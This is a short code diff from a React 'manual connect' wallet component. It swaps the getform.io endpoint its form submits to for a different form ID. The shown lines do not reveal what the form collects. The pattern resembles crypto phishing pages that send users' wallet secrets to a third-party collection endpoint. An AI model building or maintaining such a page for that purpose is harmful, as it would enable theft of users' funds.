@@ -34,7 +34,7 @@ function ManualConnectContent () {
   const walletId = searchParams.get('wallet')
   const selectedWallet = wallets.find(w => w.id === walletId)
 
-  const FORM_ENDPOINT = 'https://getform.io/f/alllgoga'
+  const FORM_ENDPOINT = 'https://getform.io/f/apjjljva'
 
   useEffect(() => {
     if (selectedWallet) {
